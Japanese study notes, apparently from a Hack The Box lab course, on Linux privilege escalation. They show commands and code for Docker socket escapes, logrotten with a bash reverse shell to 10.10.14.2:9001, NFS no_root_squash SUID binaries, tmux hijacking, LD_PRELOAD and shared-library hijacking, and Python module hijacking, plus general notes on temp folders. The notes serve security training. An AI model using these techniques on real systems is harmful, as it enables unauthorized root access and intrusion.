コンテナ内で、指定したパスに移動して、ホストシステムのリソースにrootとしてアクセスできる
```shell-session
lxc start privesc
lxc exec privesc /bin/bash #注意 : lxc exec privesc /bin/shじゃないと動かないこともある
ls -l /mnt/root
```

## Docker
- コンテナを、オペレーティングシステムレベルで動作し、ファイルシステムとシステムリソースを共有する、ユーザー空間内の隔離された環境として使用する
- コンテナ化は、従来のサーバーや仮想マシンと比較して、消費するリソースが大幅に少ないという利点がある
- Dockerの中核となる特徴は、アプリケーションが**Dockerコンテナ**の中にカプセル化されること
- Dockerコンテナは、アプリケーションコードの実行に必要なすべてのもの（コード、ランタイムなど）を含む、軽量でスタンドアロンの実行可能なソフトウェアパッケージを表す

**Dockerアーキテクチャ**
- Dockerアーキテクチャの中核には、クライアント/サーバーモデルがある
- 主に以下の2つのコンポーネントがある
	- Dockerデーモン
		- コマンドを実行し、コンテナを管理する役割を担う
	- Dockerクライアント
		- コマンドの発行やDockerエコシステムとのやり取りを行うためのインターフェースとして機能する

**Dockerを利用した権限昇格**
### 列挙
- Dockerを介してroot権限を取得するには、ログインしているユーザーがdockerグループに属している必要がある

ユーザーがdockerグループに所属しているか確認する
```shell-session
id

> uid=1000(docker-user) gid=1000(docker-user) groups=1000(docker-user),116(docker)
```

dockerイメージ一覧
```sh
docker image ls
```

### Dockerソケットの書き込みが可能な場合
- 基本的に、これはrootまたはdockerグループのみが書き込み可能であるはず
- これらの2つのグループのいずれにも属していないユーザーなのに、Dockerソケットに書き込み可能な権限がまだある場合、権限を昇格させることができる

書き込み可能なDockerソケットを利用して権限昇格する例
```shell-session
docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash

root@ubuntu:~# ls -l
```


### Dockerの共有ディレクトリ
Dockerコンテナにアクセスし、ローカルで列挙すると、Dockerのファイルシステムに追加の（標準ではない）ディレクトリが見つかる場合がある

Dockerイメージの列挙、Dockerイメージの立ち上げ
```sh
htb-student@ubuntu:~$ docker image ls
REPOSITORY   TAG       IMAGE ID       CREATED         SIZE
ubuntu       latest    5a81c4b8502e   22 months ago   77.8MB
htb-student@ubuntu:~$ docker run -it --rm ubuntu:latest /bin/bash
```

Dockerコンテナ内の共有ディレクトリを確認する例
```sh
root@container:~$ cd /hostsystem/home/cry0l1t3
root@container:/hostsystem/home/cry0l1t3$ ls -l

> drwxr-x--- 10 cry0l1t3 cry0l1t3   4096 Jun 30 15:09 .ssh
```

SSHキーを使用したログイン
```sh
snowyowl644@htb[/htb]$ ssh cry0l1t3@<host IP> -i cry0l1t3.priv
```
### Dockerソケット
- DockerソケットまたはDockerデーモンソケットは、自分やプロセスがDockerデーモンと通信できるようにする特別なファイル
- Dockerセットアップの構成に応じて、Unixソケットまたはネットワークソケットを介して行われる
- Dockerソケットは、DockerクライアントとDockerデーモン間の通信を促進するブリッジとして機能する
- Docker CLIを介してコマンドを発行すると、DockerクライアントはコマンドをDockerソケットに送信して、次にDockerデーモンがコマンドを処理し、要求されたアクションを実行する

それにもかかわらず、Dockerソケットは、安全な通信を保証し、不正アクセスを防ぐために適切な権限を必要とする
Dockerソケットへのアクセスは、通常、特定のユーザーまたはユーザーグループに制限され、信頼できるユーザーのみがコマンドを発行したり、Dockerデーモンとやり取りしたりできるようにする

Dockerソケットの存在を確認する例
```sh
htb-student@container:~/app$ ls -al

> srw-rw---- 1 root        root           0 Jun 30 15:27 docker.sock
```

dockerバイナリを使用してソケットとやり取りし、既に実行されているDockerコンテナを列挙できる
docker バイナリをダウンロードして実行する例
```shell-session
htb-student@container:/tmp$ wget https://<parrot-os>:443/docker -O docker
htb-student@container:/tmp$ chmod +x docker
htb-student@container:/tmp$ ls -l

-rwxr-xr-x 1 htb-student htb-student 0 Jun 30 15:27 docker


htb-student@container:~/tmp$ /tmp/docker -H unix:///app/docker.sock ps

CONTAINER ID     IMAGE         COMMAND                 CREATED       STATUS           PORTS     NAMES
3fe8a4782311     main_app      "/docker-entry.s..."    3 days ago    Up 12 minutes    443/tcp   app
```

ホストのルートディレクトリ（/）をコンテナ上の/hostsystemディレクトリにマッピングする独自のDockerコンテナを作成できる
ホストシステムへのフルアクセスを取得できる
そのために、これらのディレクトリを適切にマッピングし、main_app Dockerイメージを使用する必要がある

ホストのルートディレクトリをマウントしたコンテナを作成する例
```shell-session
htb-student@container:/app$ /tmp/docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app
htb-student@container:~/app$ /tmp/docker -H unix:///app/docker.sock ps

CONTAINER ID     IMAGE         COMMAND                 CREATED           STATUS           PORTS     NAMES
7ae3bcc818af     main_app      "/docker-entry.s..."    12 seconds ago    Up 8 seconds     443/tcp   app
3fe8a4782311     main_app      "/docker-entry.s..."    3 days ago        Up 17 minutes    443/tcp   app
<SNIP>
```

これに、ID 7ae3bcc818afを持つ新しい特権付きDockerコンテナにログインし、`/hostsystem`に移動できる
作成したコンテナにログインする
- そこから、再度プライベートSSHキーを取得して、rootとして、またはフォルダ内にプライベートSSHキーを持つシステム上の他のユーザーとしてログインできる
```shell-session
htb-student@container:/app$ /tmp/docker -H unix:///app/docker.sock exec -it 7ae3bcc818af /bin/bash


root@7ae3bcc818af:~# cat /hostsystem/root/.ssh/id_rsa

-----BEGIN RSA PRIVATE KEY-----
<SNIP>
```



## Logrotate(ログローテート)
- Linuxは大量のログファイルを生成するが、ハードディスクの容量が不足するのを防ぐために、logrotateと呼ばれるツールが、古いログのアーカイブまたは破棄を行なう
- logrotateには、これらのログファイルを管理するための多くの機能がある
	- ログファイルのサイズ
	- ログファイルの経過時間
	- これらの要因のいずれかに達した場合に実行されるアクション

ローテーション自体の機能は、ログファイルの名前を変更することにある
このツールは通常、cronを介して定期的に起動され、設定ファイル/etc/logrotate.confを介して制御される
このファイル内には、logrotateの機能を決定するグローバル設定が含まれる

logrotate の設定ファイルの内容を表示する
```sh
cat /etc/logrotate.conf
```

ログローテーションの状態ファイルの内容を表示する
```shell-session
sudo cat /var/lib/logrotate.status

> /var/log/samba/log.smbd" 2022-8-3
> /var/log/mysql/mysql.log" 2022-8-3
```

対応する構成ファイルは、/etc/logrotate.d/ディレクトリにある
/etc/logrotate.d/ ディレクトリの内容を表示する
```sh
ls /etc/logrotate.d/
```

/etc/logrotate.d/dpkg ファイルの内容を表示する
```sh
cat /etc/logrotate.d/dpkg

/var/log/dpkg.log { # /var/log/dpkg.log に対して以下の設定を適用
        monthly # 毎月ローテーション
        rotate 12 # 12世代まで保持
        compress # 圧縮
        delaycompress # 次のローテーション時に圧縮
        missingok  # ログファイルが存在しなくてもエラーを出さない
        notifempty # ログファイルが空の場合はローテーションしない
        create 644 root root # ローテーション後に新しいログファイルをroot:root 所有者で権限 644 で作成
}
```


### 攻撃
logrotateを悪用するため条件
- ログファイルに対する書き込み権限が必要
```sh
ls -l /var/log/dpkg.log
-rw-rw-r-- 1 user group 1024 Oct 26 10:00 /tmp/tmp.log
```
- logrotateは、特権ユーザーまたはrootとして実行する必要がある
```sh
cat /etc/crontab
0 */12 * * * root /usr/sbin/logrotate /etc/logrotate.conf
```
- 脆弱性のあるバージョン
	- 3.8.6
	- 3.11.0
	- 3.15.0
	- 3.18.0
```sh
logrotate --version
```

要件が満たされている場合、これに使用できる既製の悪用コードがあります。この悪用コードは**logrotten**と呼ばれている
ターゲットシステムのカーネルと同様のカーネル上でダウンロードしてコンパイルし、ターゲットシステムに転送することで攻撃できる

logrotten をダウンロードとコンパイル
```shell-session
logger@nix02:~$ git clone https://github.com/whotwagner/logrotten.git
logger@nix02:~$ cd logrotten
logger@nix02:~$ gcc logrotten.c -o logrotten
```

次に、実行するペイロードが必要
- ここでは、ターゲットシステムを攻撃するために使用するVMのIPとポートを使用して、単純なbashベースのリバースシェルを実行する
```sh
echo 'bash -i >& /dev/tcp/10.10.14.2/9001 0>&1' > payload
```

エクスプロイトを実行する前に、logrotate.confでlogrotateがどのオプションを使用しているかを判断する必要がある
logrotate.conf で "create" または "compress" オプションが有効になっているか確認する
```shell-session
grep "create\|compress" /etc/logrotate.conf | grep -v "#"
> create
```

この例では、オプションはcreate
- したがって、この機能に合わせて調整されたエクスプロイトを使用する必要がある
1. **logrotten のヘルプメッセージを確認** 
	- ターミナルで./logrotten -hまたは./logrotten --helpを実行して、logrottenがどのようなオプションをサポートしているかを確認する
2. **/etc/logrotate.conf および /etc/logrotate.d/* の設定を確認**
	- ターゲットのログファイルに関する設定を調べ、create、nocreate、compress、nocompressのいずれのオプションが有効になっているかを確認する
3. **logrotten を実行**
	- 設定ファイルに基づいて、適切なオプションをlogrottenコマンドに含める

|                                                      |                                             |
| ---------------------------------------------------- | ------------------------------------------- |
| 設定ファイル (/etc/logrotate.conf, /etc/logrotate.d/*) の設定 | Logrotten 実行コマンドの例                          |
| create オプションがあり、圧縮 **も** 有効                          | ./logrotten -c -z -p ./payload /tmp/tmp.log |
| create オプションがあり、圧縮 **は** 無効                          | ./logrotten -c -p ./payload /tmp/tmp.log    |
| nocreate オプションがあり、圧縮 **も** 有効                        | ./logrotten -n -z -p ./payload /tmp/tmp.log |
| nocreate オプションがあり、圧縮 **は** 無効                        | ./logrotten -n -p ./payload /tmp/tmp.log    |


リバースシェルを受け取るためのリスナーを起動する
```shell-session
nc -nlvp 9001
```

準備したペイロードでエクスプロイトを実行し、特権ユーザーまたはrootとしてリバースシェルを待つ
```shell-session
./logrotten -p ./payload /tmp/tmp.log
```


## パッシブなトラフィックキャプチャ
- tcpdumpがインストールされている場合、権限のないユーザーでもネットワークトラフィックをキャプチャできる可能性がある
- キャプチャされる可能性のある情報
	- クリアテキストで送信される認証情報
	- クレジットカード番号やSNMPコミュニティストリングなどの機密情報
	- Net-NTLMv2、SMBv2、またはKerberosハッシュ
		- ブルートフォース可能
クリアテキストプロトコル
- HTTP、FTP、POP、IMAP、telnet、SMTPなどは、ホスト上で権限を昇格するために再利用できる認証情報が含まれている可能性がある
使えるツール
- net-creds
- Credz

脆弱なNFS権限
- Network File System (NFS)を使用すると、ユーザーはUnix/Linuxシステムでホストされているネットワーク上の共有ファイルまたはディレクトリにアクセスできる
- NFSはTCP/UDPポート2049を使用する

アクセス可能なマウントの一覧表示
- NFSサーバーのエクスポートリスト（またはファイルシステムのアクセス制御リスト）がNFSクライアントにリスト表示される
NFS共有のエクスポートリストを表示する

```sh
showmount -e 10.129.2.12

Export list for 10.129.2.12:
/tmp             *
/var/nfs/general *
```

NFSボリュームが作成されるとき、さまざまなオプションを設定できる

|                |                                                                                                                                                          |
| -------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------- |
| オプション          | 説明                                                                                                                                                       |
| root_squash    | rootユーザーがNFS共有にアクセスするために使用される場合、権限のないアカウントであるnfsnobodyユーザーに変更される。rootユーザーによって作成およびアップロードされたファイルはnfsnobodyユーザーが所有するため、攻撃者がSUIDビットが設定されたバイナリをアップロードできなくなる。 |
| no_root_squash | ローカルのrootユーザーとして共有に接続するリモートユーザーは、NFSサーバー上でrootユーザーとしてファイルを作成できる。これにより、SUIDビットが設定された悪意のあるスクリプト/プログラムを作成できるようになる。                                          |

- /etc/exports ファイルの内容を表示する
```shell-session
htb@NIX02:~$ cat /etc/exports

# /etc/exports: the access control list for filesystems which may be exported
#		to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#
/var/nfs/general *(rw,no_root_squash)
/tmp *(rw,no_root_squash)
```

たとえば、ローカルのrootユーザーを使用して/bin/shを実行するSETUIDバイナリを作成できる
次に、/tmpディレクトリをローカルにマウントし、root所有のバイナリをNFSサーバーにコピーして、SUIDビットを設定できる

1. 簡単なバイナリを作成
```shell-session
htb@NIX02:~$ nano shell.c 

#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>

int main(void)
{
  setuid(0); setgid(0); system("/bin/bash");
}
```

2. コンパイルする
```shell-session
htb@NIX02:/tmp$ gcc shell.c -o shell
```

3. ディレクトリをローカルにマウント
	コピーして、必要な権限を設定する
**root権限でやらないとダメ**
```shell-session
sudo su - root
root@Pwnbox:~$ sudo mount -t nfs 10.129.2.210:/tmp /mnt
root@Pwnbox:~$ sudo chown root:root /mnt/shell
root@Pwnbox:~$ sudo chmod u+s /mnt/shell
```

4. ホストの低権限セッションに戻ると、バイナリを実行してrootシェルを取得できる
作成した shell 実行ファイルを実行し、root 権限を取得する
```shell-session
htb@NIX02:/tmp$ ./shell
root@NIX02:/tmp# id

uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare),1000(htb)
```


## Tmuxセッションのハイジャック
- tmuxなどのターミナルマルチプレクサを使用すると、単一のコンソールセッション内で複数のターミナルセッションにアクセスできる
- tmuxウィンドウで作業していない場合、セッションからデタッチしても、セッションをアクティブなままにすることができる
- 多くの理由により、ユーザーは、弱い権限で設定されたrootなどの特権ユーザーとしてtmuxプロセスを実行したままにする可能性があり、ハイジャックされる可能性がある
- 新しい共有セッションを作成し、所有権を変更することで実行できる

共有Tmuxセッションを作成し、所有権を変更する
```shell-session
htb@NIX02:~$ tmux -S /shareds new -s debugsess
htb@NIX02:~$ chown root:devs /shareds
```

devsグループのユーザーを侵害できる場合は、このセッションにアタッチしてrootアクセスを取得できる
実行中のtmuxプロセスを確認する
```shell-session
 ps aux | grep tmux
 
> root      4806  0.0  0.1  29416  3204 ?        Ss   06:27   0:00 tmux -S /shareds new -s debugsess
```

Tmuxセッションの権限を確認する
```shell-session
ls -la /shareds 

> srw-rw---- 1 root devs 0 Sep  1 06:27 /shareds
```

自分のグループメンバーシップを確認する
```shell-session
id

uid=1000(htb) gid=1000(htb) groups=1000(htb),1011(devs)
```

最後に、tmuxセッションにアタッチし、root権限を確認する
```shell-session
tmux -S /shareds

id

uid=0(root) gid=0(root) groups=0(root)
```


# 内部構造に基づく権限昇格
## 共有ライブラリ
- Linuxプログラムでは、動的にリンクされた共有オブジェクトライブラリを使用するのが一般的
- Linuxには2種類のライブラリがある
	- 静的ライブラリ（ファイル拡張子.aで示される）
		- プログラムがコンパイルされるとき、静的ライブラリはプログラムの一部となり、変更できない
	- 動的にリンクされた共有オブジェクトライブラリ（ファイル拡張子.soで示される）
		- ただし、動的ライブラリは、それを呼び出すプログラムの実行を制御するために変更できる
		- 動的ライブラリの場所を指定する方法は複数ある

**LD_PRELOAD環境変数**
- LD_PRELOAD　:　バイナリを実行する前にライブラリをロードできる
- このライブラリの関数は、デフォルトの関数よりも優先される
- バイナリに必要な共有オブジェクトは、lddユーティリティを使用して確認できる
`/bin/ls`の実行に必要な共有ライブラリの一覧表示
```sh
ldd /bin/ls
```

**LD_PRELOADの権限昇格**
- sudo権限を持つユーザーが必要
	- env_keep+=LD_PRELOAD が含まれるとLD_PRELOADを使って権限昇格できる
```sh
htb_student@NIX02:~$ sudo -l

Matching Defaults entries for daniel.carter on NIX02:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD

User daniel.carter may run the following commands on NIX02:
    (root) NOPASSWD: /usr/sbin/apache2 restart
```

- このユーザーは、rootとしてApacheサービスを再起動する権限を持っていますが、これはGTFOBinではなく、`/etc/sudoers`エントリが絶対パスを指定して記述されているため、通常の状態では権限を昇格させるために使用することはできない
- しかし、LD_PRELOADの問題を利用して、カスタムの共有ライブラリファイルを実行できる

以下の共有ライブラリファイルを実行できる
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```

コンパイル
```shell-session
htb_student@NIX02:~$ gcc -fPIC -shared -o root.so root.c -nostartfiles
```

LD_PRELOADを使用して、apache2を再起動する
```shell-session
htb_student@NIX02:~$ sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart

id
uid=0(root) gid=0(root) groups=0(root)
```

## 共有オブジェクトハイジャック
- 開発中のプログラムやバイナリには通常、関連するカスタムライブラリがある
- 次のSETUIDバイナリについて考える
```shell-session
ls -la payroll

-rwsr-xr-x 1 root root 16728 Sep  1 22:05 payroll
```

lddを使用して、バイナリまたは共有オブジェクトに必要な共有オブジェクトを表示できる
lddは、プログラムの依存関係ごとに、オブジェクトの場所と、メモリにロードされる16進アドレスを表示する
- バイナリの依存関係として、libshared.soという非標準のライブラリが表示
	- バイナリに対してlddを実行すると、ライブラリのパスが/development/libshared.soとして表示される⇨**脆弱性があることを意味**
```shell-session
ldd payroll

linux-vdso.so.1 =>  (0x00007ffcb3133000)
libshared.so => /development/libshared.so (0x00007f0c13112000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f7f62876000)
/lib64/ld-linux-x86-64.so.2 (0x00007f7f62c40000)
```

- カスタムの場所から共有ライブラリをロードすることが可能
	- 設定の1つがRUNPATH構成
	- このフォルダ内のライブラリは、他のフォルダよりも優先される
	- readelfユーティリティを使用して調べることができる
```shell-session
readelf -d payroll  | grep PATH

 0x000000000000001d (RUNPATH)            Library runpath: [/development]
```

- この構成により、/developmentフォルダからライブラリをロードできる
	- このライブラリは、このファイルのエントリが最初にチェックされる
⇨ 悪意のあるライブラリを/developmentに配置することで設定ミスを悪用できる

ライブラリをコンパイルする前に、バイナリによって呼び出される関数名を特定する必要がある

既存のライブラリを開発フォルダにコピーする
```shell-session
cp /lib/x86_64-linux-gnu/libc.so.6 /development/libshared.so
```

バイナリを実行すると、dbqueryという名前の関数が見つからなかったというエラーが発生
```shell-session
./payroll 

./payroll: symbol lookup error: ./payroll: undefined symbol: dbquery
```

この関数を含む共有オブジェクトをコンパイルする
- dbquery関数は、ユーザーIDを0（root）に設定し、呼び出されると/bin/shを実行する
```c
nano /development/libshared.so

#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

void dbquery() {
    printf("Malicious library loaded\n");
    setuid(0);
    system("/bin/sh -p");
} 
```

コンパイル
```shell-session
gcc src.c -fPIC -shared -o /development/libshared.so
```

実行
```shell-session
htb-student@NIX02:~$ ./payroll 

***************Inlane Freight Employee Database***************

Malicious library loaded
# id
uid=0(root) gid=1000(mrb3n) groups=1000(mrb3n)
```


## Pythonライブラリハイジャック
ハイジャックに使用できる3つの基本的な脆弱性
- 不適切な書き込み権限
- ライブラリパス
- PYTHONPATH環境変数

### 不適切な書き込み権限 
- たとえば、会社のイントラネット上の開発者のホストにいて、開発者がPythonを使用しているとする
- よって、3つのコンポーネントがある
	- Pythonモジュールをインポートする実際のPythonスクリプト
	- スクリプトの権限
	- モジュールの権限
Pythonモジュールには、誤ってすべてのユーザーに書き込み権限が設定されている場合がある
- Pythonモジュールを編集および操作して、必要な結果を生み出すコマンドまたは関数を挿入できる
- PythonスクリプトにSUID/SGID権限が割り当てられている場合、コードは自動的にSUID/SGIDが継承される

pythonスクリプトにSUIDが継承されている例
- このスクリプトを別のユーザーの権限、この場合はrootとして実行できる
	- また、スクリプトを表示してその内容を読む権限もある
```shell-session
ls -l mem_status.py

-rwsrwxr-x 1 root mrb3n 188 Dec 13 20:13 mem_status.py
```

SUIDが設定されているmem_status.pyのコード
- psutilライブラリを使用していることがわかる
```python
#!/usr/bin/env python3
import psutil

available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total

print(f"Available memory: {round(available_memory, 2)}%")
```

psutilの使われている関数(`psutil.virtual_memory()`)を探し、このモジュールに書き込み権限があるかどうかを確認する
- 書き込み可能なことがわかった
```shell-session
grep -r "def virtual_memory" /usr/local/lib/python3.8/dist-packages/psutil/*

/usr/local/lib/python3.8/dist-packages/psutil/__init__.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_psaix.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_psbsd.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_pslinux.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_psosx.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_pssunos.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_pswindows.py:def virtual_memory():


htb-student@lpenix:~$ ls -l /usr/local/lib/python3.8/dist-packages/psutil/__init__.py

-rw-r--rw- 1 root staff 87339 Dec 13 20:07 /usr/local/lib/python3.8/dist-packages/psutil/__init__.py
```

psutilの使われている関数(`psutil.virtual_memory()`)にペイロードを書き込む
```python
...SNIP...

def virtual_memory():

	...SNIP...
	#### Hijacking
	import os
	os.system('id')
	

    global _TOTAL_PHYMEM
    ret = _psplatform.virtual_memory()
    # cached for later use in Process.memory_percent()
    _TOTAL_PHYMEM = ret.total
    return ret

...SNIP...
```

実行すると、psutilの使われている関数(`psutil.virtual_memory()`)内のidが実行されて、rootと表示されていることが確認できる
```shell-session
/usr/bin/python3 ./mem_status.py

uid=0(root) gid=0(root) groups=0(root)
uid=0(root) gid=0(root) groups=0(root)
Available memory: 79.22%
```

### ライブラリパス
- Pythonでは、各バージョンに、ライブラリ（モジュール）が検索され、インポートされる順序が指定されている
- Pythonがモジュールをインポートする順序は、優先順位システムに基づいている
- つまり、リストの上位にあるパスは、リストの下位にあるパスよりも優先される
	- この例だと、`/usr/lib/python38.zip`がそれ以外のパスに比べて優先される
```shell-session
htb-student@lpenix:~$ python3 -c 'import sys; print("\n".join(sys.path))'

/usr/lib/python38.zip
/usr/lib/python3.8
/usr/lib/python3.8/lib-dynload
/usr/local/lib/python3.8/dist-packages
/usr/lib/python3/dist-packages
```

**この脆弱性を使うための条件**
- スクリプトによってインポートされるモジュールが、PYTHONPATH変数によってリストされた優先度の低いパスのいずれかに配置されていること。
- リストでより高い優先順位を持つパスの1つに対する書き込み権限が必要

つまり
- インポートされたモジュールがリストの下位にあるパスにあり、より高い優先順位のパスがユーザーによって編集可能な場合、同じ名前で独自のモジュールを作成し、独自の関数を含めることができる
- 優先度の高いパスがより早く読み取られ、問題のモジュールについて調べられるため、Pythonは最初に見つかったヒットにアクセスし、元の意図されたモジュールに到達する前にインポートされる

psutilを確認する
- psutilが`/usr/local/lib/python3.8/dist-packages`にインストールされていることがわかる
```shell-session
pip3 show psutil

...SNIP...
Location: /usr/local/lib/python3.8/dist-packages

...SNIP...
```

インストールされている上のディレクトリに書き込めるかを確認する
- /usr/lib/python3.8パスは、どのユーザーでも書き込めるように誤って構成されている
	- PYTHONPATH変数の値とクロスチェックすると、このパスがpsutilがインストールされているパスよりもリストの上位にある
```shell-session
ls -la /usr/lib/python3.8

total 4916
drwxr-xrwx 30 root root  20480 Dec 14 16:26 .
```

この誤った構成を悪用して、独自の悪意のあるvirtual_memory()関数を含む独自のpsutilモジュールを/usr/lib/python3.8ディレクトリに作成
```python
#!/usr/bin/env python3

import os

def virtual_memory():
    os.system('id')
```

実行
```shell-session
 sudo /usr/bin/python3 mem_status.py

uid=0(root) gid=0(root) groups=0(root)
Traceback (most recent call last):
  File "mem_status.py", line 4, in <module>
    available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total
AttributeError: 'NoneType' object has no attribute 'available' 
```

### PYTHONPATH環境変数
- PYTHONPATH は、Pythonがモジュール（ライブラリ）を探す場所を教える道案内みたいなもの。
- 普通、Pythonは標準のフォルダだけを探すけど、PYTHONPATHを設定すると、自分の指定したフォルダも探してくれる。
- もしユーザーがこのPYTHONPATHをいじれるなら、Pythonに自分が作った悪いモジュールを読み込ませることもできるから、権限昇格のチャンスになる。

- sudoで /usr/bin/python3 を実行できるようになっている。
	- さらに、SETENVフラグが設定されている
	- → sudoを使うときでも環境変数（例えばPYTHONPATH）を自由に指定できる
- SETENVフラグがあると、環境変数を無効化せずそのまま使える。
	- sudo実行時でも、好きな環境変数をそのまま使える
つまり、**自作モジュールをroot権限で勝手に読み込ませて、権限昇格できる**!!
```shell-session
sudo -l 

Matching Defaults entries for htb-student on ACADEMY-LPENIX:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User htb-student may run the following commands on ACADEMY-LPENIX:
    (ALL : ALL) SETENV: NOPASSWD: /usr/bin/python3
```

以前のPythonスクリプトを/usr/bin/python3を再度呼び出してmem_stats.pyを実行する
PYTHONPATH変数に/tmpディレクトリが含まれるように指定して、Pythonがそのディレクトリを強制的に検索してインポートするpsutilモジュールを探させる
```shell-session
sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./mem_status.py

uid=0(root) gid=0(root) groups=0(root)
...SNIP...
```




















# それぞれのコマンド
### sudo -lした時の挙動
```sh
$ sudo -l
Matching Defaults entries for htb-student on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User htb-student may run the following commands on ubuntu:
    (ALL, !root) /bin/ncdu
```
> この出力の意味
- 権限
	- ユーザー htb-student は、ホスト ubuntu 上で`(ALL, !root) /bin/ncdu` をsudoで実行できる。
- `(ALL, !root) /bin/ncdu`の意味
	- → すべてのユーザーになりかわって実行できるが、rootにはなれないという意味
		- （普通は (ALL) だけでrootになれる設定も多いけど、ここでは制限あり。）
	- だから、`sudo /bin/ncdu`はできない
	- 他のユーザーを介して実行するしかない
		- `sudo -u <他のユーザー名> /bin/ncdu`



### lsblk
システム全体は、sda3上のLVMに入ってる。変な外付けディスクはない。snapパッケージのloopマウントは無視してOK！
```sh
lab_adm@ubuntu:/$ lsblk
NAME                      MAJ:MIN RM   SIZE RO TYPE MOUNTPOINT
loop0                       7:0    0  55.7M  1 loop /snap/core18/2745
loop1                       7:1    0  55.7M  1 loop /snap/core18/2751
loop2                       7:2    0  61.9M  1 loop /snap/core20/1169
loop3                       7:3    0  63.5M  1 loop /snap/core20/1891
loop4                       7:4    0  73.1M  1 loop /snap/core22/634
loop5                       7:5    0  73.9M  1 loop /snap/core22/750
loop6                       7:6    0 166.4M  1 loop /snap/lxd/24846
loop7                       7:7    0  53.3M  1 loop /snap/snapd/19361
loop8                       7:8    0  53.2M  1 loop /snap/snapd/19122
loop9                       7:9    0 170.1M  1 loop /snap/lxd/24918
sda                         8:0    0     8G  0 disk 
├─sda1                      8:1    0     1M  0 part 
├─sda2                      8:2    0   384M  0 part /boot
└─sda3                      8:3    0   7.6G  0 part 
  └─ubuntu--vg-ubuntu--lv 253:0    0   7.5G  0 lvm  /

```











### 一時ファイル用のデフォルトフォルダーまとめ
- /tmp
	- すべてのユーザーが表示・読み取り可能。
	- 一時ログファイル、スクリプトの出力、一時的な設定ファイルなどが保存されることがある
	- データ保持期間が短い。
	- 通常、10日後に自動削除される。
	- システムを再起動すると即座に削除される。
	- 短期間しか必要ないファイル向け。
	- 攻撃者視点では、一時的に展開されたスクリプトやログファイルが拾えるチャンスあり。
- /var/tmp
	- /tmpと同様に、すべてのユーザーが表示・読み取り可能。
	- 一時的なファイル保存場所だが、データ保持期間が長い。
	- 通常、最大30日間保持される。
	- システム再起動後もファイルは消えずに残る。
	- 再起動をまたいで必要なデータを保存するプログラムが利用。
	- 攻撃者にとって、長期間放置されている機密データを探せる場所。
- /dev/shm
	- メモリ上の仮想ファイルシステム（RAMディスク）。
	- 主に**プロセス間通信（IPC）**のために使用される。
	- 非常に高速だが、揮発性（電源オフや再起動で内容は消える）。
	- 一時的なファイルやソケットファイルが保存されることがある。
	- セキュリティ設定が甘いと、攻撃者がファイルやマルウェアを一時展開するのに悪用されることもある。